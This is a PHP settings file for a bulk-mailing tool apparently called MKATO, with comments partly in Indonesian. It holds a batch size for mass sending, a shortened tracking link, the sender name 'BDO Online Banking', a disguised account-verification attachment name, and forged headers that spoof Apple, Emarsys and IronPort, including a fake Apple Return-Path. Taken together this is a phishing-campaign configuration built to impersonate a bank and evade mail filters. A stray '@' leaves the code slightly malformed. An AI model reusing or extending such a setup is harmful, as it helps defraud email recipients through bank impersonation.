<?php
###############################################
#$            C0d3d by Amoskun               $#
#$  Recoding Tidak membuatmu menjadi Coder   $#
#$          Copyright 2019 MKATO             $#
###############################################
$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$mkato_smtp = 'for-test.csv';
$mkato_list = [
	'file'				=> 'list.txt',
	'removeduplicate'		=> false,
];


$mkato_setting = [
	'color'				=> true,@
	'max'				=> '70', // total of emails to send per sending
	'delay'				=> '1', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'base64', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'		=> true, // instert your email at last sending
	'emailtest'			=> 'mailer2231@yahoo.com', // input your email , can be multi emails
	'priority'			=> '3',	// 1=high, 3=normal, 5=low
	'randomparam'			=> true,
	'link'				=> 'https://o.tt/1N4EKd', // input link here to use a random link fiture
	'header'			=> false,
];

$mkato_inbox = [
	#--start--#
	[
		'to' 					=> 'callcenter@bdoonline.com', // to
		'fname' 				=> 'BDO Online Banking', // from name
		'subject' 				=> "subject ", // subject
		'attachfile'				=> '', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 				=> "Verificação de conta no BrasilID 389-7868789.doc", // nama yang diinginkan untuk ganti nama file
		'letter'				=> 's.html',

	],
	#--end--#


];

$mkato_header = array(
	'X-Apple|FMLEARHH;mlfy70ipke5usqkk',
	'X-EMarSys-Identify|895550201_6168_0577754',
	'X-eC-messenger-token|1cxy6l0byat66f',
	'X-Ironport-MID|777476139',
	'Return-Path|<6-0505947653-8662-793294403-5935524746610@email.apple.com>'
	
);




?>